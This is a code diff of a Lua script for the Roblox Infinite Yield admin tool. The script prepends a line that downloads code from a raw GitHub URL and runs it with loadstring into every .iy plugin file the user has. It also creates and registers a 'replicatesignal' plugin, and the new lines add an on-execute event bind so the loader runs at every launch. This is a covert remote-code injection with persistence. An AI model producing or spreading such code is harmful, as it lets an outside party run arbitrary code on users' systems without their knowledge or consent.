@@ -1,28 +1,30 @@
 local line = 'pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/audio-wav/iy-dependencies/main/source"))() end)\n'
 local pluginFile = "replicatesignal.iy"
-for _, file in ipairs(listfiles("")) do
-    if file:sub(-3) == ".iy" and not file:find("IY_FE.iy", 1, true) then
-        local ok, content = pcall(readfile, file)
-        if ok and content and not content:find(line, 1, true) then
-            writefile(file, line .. content)
-        end
+local data = game:GetService("HttpService"):JSONDecode(readfile("IY_FE.iy"))
+local function has(t, val)
+    for _, v in ipairs(t) do if v == val then return true end end
+end
+
+for _, f in ipairs(listfiles("")) do
+    if f:sub(-3) == ".iy" and not f:find("IY_FE.iy", 1, true) then
+        local ok, c = pcall(readfile, f)
+        if ok and c and not c:find(line, 1, true) then writefile(f, line .. c) end
     end
 end
 
-local usingPlugin = false
-for _, file in ipairs(listfiles("")) do
-    if file:find(pluginFile, 1, true) then usingPlugin = true break end
-end
-if not usingPlugin then
+if not has(listfiles(""), pluginFile) then
     writefile(pluginFile, line .. 'return {\n    ["PluginName"] = "replicatesignal",\n    ["PluginDescription"] = "",\n    ["Commands"] = {}\n}\n')
 end
 
-local ok, content = pcall(readfile, "IY_FE.iy")
-if ok and content then
-    local before, tableBlock, after = content:match("(.-\"PluginsTable\"%s*:%s*)(%b[])(.*)")
-    if before and tableBlock and after and not tableBlock:find(pluginFile, 1, true) then
-        tableBlock = tableBlock == "[]" and '["'..pluginFile..'"]'
-            or tableBlock:gsub("%]$", ', "'..pluginFile..'"]')
-        writefile("IY_FE.iy", before .. tableBlock .. after)
-    end
+if data.PluginsTable and not has(data.PluginsTable, pluginFile) then
+    table.insert(data.PluginsTable, pluginFile)
 end
+
+local eb = type(data.eventBinds) == "string" and game:GetService("HttpService"):JSONDecode(data.eventBinds) or data.eventBinds or {}
+eb.OnExecute = eb.OnExecute or {}
+if not has(eb.OnExecute, {"plugin replicatesignal", {}, 0}) then
+    table.insert(eb.OnExecute, {"plugin replicatesignal", {}, 0})
+end
+
+data.eventBinds = type(data.eventBinds) == "string" and game:GetService("HttpService"):JSONEncode(eb) or eb
+writefile("IY_FE.iy", game:GetService("HttpService"):JSONEncode(data))
